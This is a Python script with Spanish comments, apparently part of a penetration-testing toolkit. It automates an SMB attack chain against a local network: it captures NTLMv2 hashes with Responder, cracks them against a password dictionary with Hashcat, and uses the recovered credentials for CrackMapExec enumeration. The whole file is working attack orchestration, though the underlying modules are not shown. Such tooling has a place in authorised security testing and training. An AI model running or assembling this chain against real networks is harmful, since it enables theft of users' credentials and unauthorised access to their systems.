import sys  # Para capturar argumentos de la línea de comandos
import os  # Para manejar rutas de archivos y directorios

# Añadir el path raíz del proyecto al sys.path para importar módulos locales
CURRENT_DIR = os.path.dirname(os.path.abspath(__file__))  # Ruta del archivo actual
ROOT_DIR = os.path.abspath(os.path.join(CURRENT_DIR, ".."))  # Ruta del directorio raíz del proyecto
if ROOT_DIR not in sys.path:
    sys.path.insert(0, ROOT_DIR)  # Se añade a sys.path si aún no está

# Importación de los módulos necesarios para el ataque SMB
from modules.credential_capture import run_responder  # Captura de hashes NTLMv2 usando Responder
from modules.hash_cracking import crack_hashes  # Crackeo de hashes con Hashcat
from modules.advanced_enumeration import enumerate_with_credentials  # Enumeración con CrackMapExec

def ejecutar_ataque_smb(interface, dictionary_path):
    """
    Ejecuta un flujo completo de ataque SMB:
    1. Captura de hashes NTLMv2.
    2. Crackeo de hashes capturados.
    3. Enumeración avanzada con credenciales crackeadas.
    """
    print("[*] Lanzando ataque SMB: Responder + Crackeo + Enumeración")

    hashes_path = "results/smb/hashes.txt"  # Ruta donde se guardarán los hashes capturados

    # Elimina hashes anteriores si existen
    try:
        if os.path.exists(hashes_path):
            os.remove(hashes_path)
            print("[*] Hashes anteriores eliminados.")
    except Exception as e:
        print(f"[!] No se pudo eliminar hashes anteriores: {e}")
        input("[*] Pulsa ENTER para cerrar esta terminal.")
        return

    # Lanza Responder para capturar hashes NTLMv2
    try:
        run_responder(interface)
    except Exception as e:
        print(f"[!] Error ejecutando Responder: {e}")
        input("[*] Pulsa ENTER para cerrar esta terminal.")
        return

    # Verifica que se haya generado el archivo con los hashes
    if not os.path.exists(hashes_path) or os.path.getsize(hashes_path) == 0:
        print("[-] No se capturaron hashes.")
        input("[*] Pulsa ENTER para cerrar esta terminal.")
        return

    print("[+] Hashes capturados. Iniciando crackeo...")

    # Crackea los hashes capturados usando el diccionario proporcionado
    credenciales = crack_hashes(hashes_path, dictionary_path)
    if not credenciales:
        print("[!] No se pudo crackear ningún hash.")
        input("[*] Pulsa ENTER para cerrar esta terminal.")
        return

    print("[+] Hashes crackeados. Ejecutando enumeración avanzada...")

    # Usa las credenciales crackeadas para realizar una enumeración avanzada SMB
    try:
        enumerate_with_credentials(credenciales)
        print("[✓] Módulo SMB finalizado correctamente.")
    except Exception as e:
        print(f"[!] Error durante la enumeración: {e}")
        input("[*] Pulsa ENTER para cerrar esta terminal.")
        return

    # Si todo fue exitoso, el script finaliza sin errores

# Entrada principal del script, gestionando argumentos
if __name__ == "__main__":
    # Verifica que se proporcionen los dos argumentos necesarios
    if len(sys.argv) != 3:
        print("Uso: python3 smb_runner.py <INTERFAZ> <DICCIONARIO>")
        sys.exit(1)

    interfaz = sys.argv[1]  # Nombre de la interfaz de red (por ejemplo, eth0)
    diccionario = sys.argv[2]  # Ruta al diccionario de contraseñas
    ejecutar_ataque_smb(interfaz, diccionario)
